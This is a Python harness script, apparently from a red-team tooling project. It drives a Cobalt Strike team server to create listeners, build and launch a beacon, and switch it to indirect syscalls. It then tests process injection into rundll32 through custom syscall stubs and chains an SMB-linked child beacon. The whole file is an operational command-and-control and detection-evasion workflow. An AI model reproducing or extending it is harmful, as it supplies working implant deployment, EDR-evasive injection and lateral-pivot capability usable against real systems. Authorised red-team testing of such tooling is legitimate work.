# -*- coding: utf-8 -*-
r"""f26_v3_live.py - round 26 live: run the REAL beacon with syscall_method=2
so the injection family goes through the v3 synthetic-frame stubs.

Coverage (all >4-arity = v3): NtAllocateVirtualMemory(6) +
NtWriteVirtualMemory(5) + NtProtectVirtualMemory(5) + NtCreateThreadEx(11)
via `spawn`; NtOpenProcess(3)/NtClose(1) via ps; SMB link child rides the
same inject chain. Adjudication = r1.log bytes only."""
import os
import re
import subprocess
import time
from pathlib import Path

DIR = Path(r"C:\Users\Administrator\Desktop\cobaltstrike\cs-agscript-mcp\scripts")
LOG = DIR / "r1.log"
INBOX = DIR / "r1_inbox.txt"
ACK = DIR / "r1_ack.txt"
TRACE = Path(r"C:\Users\Public\spawn_trace.txt")

results = []


def send(cmd, *args):
    prev = ACK.read_text().strip() if ACK.exists() else ""
    line = "\t".join((cmd,) + tuple(str(a) for a in args)) + "\n"
    tmp = INBOX.with_suffix(".tmp")
    tmp.write_text(line, encoding="utf-8")
    os.replace(tmp, INBOX)
    for _ in range(40):
        time.sleep(0.5)
        try:
            cur = ACK.read_text().strip()
        except OSError:
            continue
        if cur and cur != prev:
            return cur
    return None


def wait_for(pattern, timeout=75.0):
    rx = re.compile(pattern, re.M)
    pos = len(LOG.read_text(encoding="utf-8", errors="replace")) if LOG.exists() else 0
    t0 = time.time()
    while time.time() - t0 < timeout:
        time.sleep(1.0)
        data = LOG.read_text(encoding="utf-8", errors="replace")
        chunk = data[pos:]
        m = rx.search(chunk)
        pos = len(data)
        if m:
            return m
    return None


def launch(exe):
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    "Start-Process -FilePath '%s' -WorkingDirectory 'C:\\Users\\Public'" % exe],
                   capture_output=True)


def main():
    if TRACE.exists():
        TRACE.unlink()

    # P0 parent beacon
    send("listener_create", "http_e26", "8096")
    time.sleep(1)
    send("artifact", "http_e26", "exe", "x64", "C:/Users/Public/beacon_e26.exe")
    launch("C:/Users/Public/beacon_e26.exe")
    m = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew beacon_e26\.exe", 75)
    if not m:
        results.append(("P0 INITIAL", False, "-"))
        return finish()
    bid = m.group(1)
    send("target", bid)
    send("pwd")
    m0 = wait_for(r"^\S+\s+ALT\t" + bid + r"\t.{10,}", 60)
    results.append(("P0 parent pwd", bool(m0), "bid=%s" % bid))

    # P1 switch the live beacon to syscall_method=2 - the bridge takes the
    # METHOD NAME (BeaconSyscallMethod: None/Direct/Indirect); a bare "2"
    # is invalid and the task silently never ships (first run's lesson)
    pos_m = len(LOG.read_text(encoding="utf-8", errors="replace")) if LOG.exists() else 0
    send("syscall_method", "Indirect")
    time.sleep(2)
    window = LOG.read_text(encoding="utf-8", errors="replace")[pos_m:]
    mack = re.search(r"Tasked beacon to change the syscall method to Indirect", window)
    results.append(("P1 method=Indirect tasked", bool(mack), ""))
    send("ps")
    m1 = wait_for(r"^\S+\s+PS\t" + bid + r"\t.{20,}", 75)
    results.append(("P1 ps @m=2", bool(m1), "gate openproc/close alive"))

    # P2 spawn through v3 (alloc6+write5+protect5+threadex11)
    send("spawn", "http_e26", "x64")
    mp = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew rundll32\.exe", 110)
    if not mp:
        results.append(("P2 v3 inject spawn", False, "no child"))
        return finish()
    pbid = mp.group(1)
    send("target", pbid)
    send("ls")
    mp2 = wait_for(r"^\S+\s+LS\t" + pbid + r"\t.{20,}", 75)
    results.append(("P2 v3 inject spawn", bool(mp2), "child=%s ls=%dB" % (pbid, len(mp2.group(0)) if mp2 else 0)))

    # P3 SMB link child through v3 (composite spawn+auto-link off the spawned child)
    send("smb_listener_create", "smb_e26", "e26pipe")
    time.sleep(1)
    pos0 = len(LOG.read_text(encoding="utf-8", errors="replace"))
    send("spawn", "smb_e26", "x64")
    ms = wait_for(r"^\S+\s+INITIAL\t(\d+)\tnew rundll32\.exe", 120)
    window = LOG.read_text(encoding="utf-8", errors="replace")[pos0:]
    link = re.search(r"established link to child beacon", window)
    smb_ok = bool(ms) and bool(link)
    if ms:
        send("target", ms.group(1))
        send("getuid")
        ms2 = wait_for(r"^\S+\s+ALT\t" + ms.group(1) + r"\t.{10,}", 60)
        smb_ok = bool(ms2) and bool(link)
    results.append(("P3 v3 SMB link child", smb_ok,
                    "grandchild=%s" % (ms.group(1) if ms else "-")))

    # P4 parent still alive after all v3 traffic
    send("target", bid)
    send("pwd")
    m4 = wait_for(r"^\S+\s+ALT\t" + bid + r"\t.{10,}", 60)
    results.append(("P4 parent alive post-v3", bool(m4), ""))

    # evidence: inject trace (if the build carries spawn_trace)
    trace_note = "absent"
    if TRACE.exists():
        t = TRACE.read_text(errors="replace")
        if "inject_logic: execute ok" in t:
            trace_note = "inject ok"
        else:
            trace_note = "%dB" % len(t)
    results.append(("EVID spawn_trace", True, trace_note))
    return finish()


def finish():
    print("== RESULTS ==", flush=True)
    npass = 0
    for name, ok, info in results:
        print("%-26s %-5s %s" % (name, "PASS" if ok else "FAIL", info), flush=True)
        npass += ok
    print("TOTAL: %d/%d" % (npass, len(results)), flush=True)


if __name__ == "__main__":
    main()
